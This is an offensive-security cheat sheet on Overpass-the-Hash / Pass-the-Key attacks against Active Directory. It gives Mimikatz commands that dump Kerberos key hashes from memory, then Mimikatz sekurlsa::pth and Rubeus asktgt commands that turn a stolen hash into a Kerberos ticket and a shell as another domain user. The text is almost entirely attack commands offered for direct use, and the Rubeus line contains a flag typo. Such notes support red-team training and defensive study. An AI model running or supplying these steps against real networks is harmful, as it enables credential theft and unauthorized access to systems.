-- -
Use a hash/key for a domain-joined user to get a TGT. 
### Get Key Hashes
```bash
# Extract Kerberos Keys from memory
mimikatz.exe
privilege::debug
sekurlsa::ekeys

# Looking for rc4_hmac_nt and Username
```
### Pass The Key or Overpass the Hash
#### Mimikatz
Does require admin privs
```powershell
mimikatz.exe
privilege::debug

# get new shell w/ TGT applied for user
sekurlsa::pth /domain:<domain> /user:<user from above> /ntlm:<hash from above>
```
#### Rubeus
You can provide the hash for `/rc4`, `/aes128`, `/aes256`, or `/des`. Does not require admin privs
```powershell
Rubeus.exe asktgt /doman:<domain> /user:<user from above> /aes256:<hash from above> 
```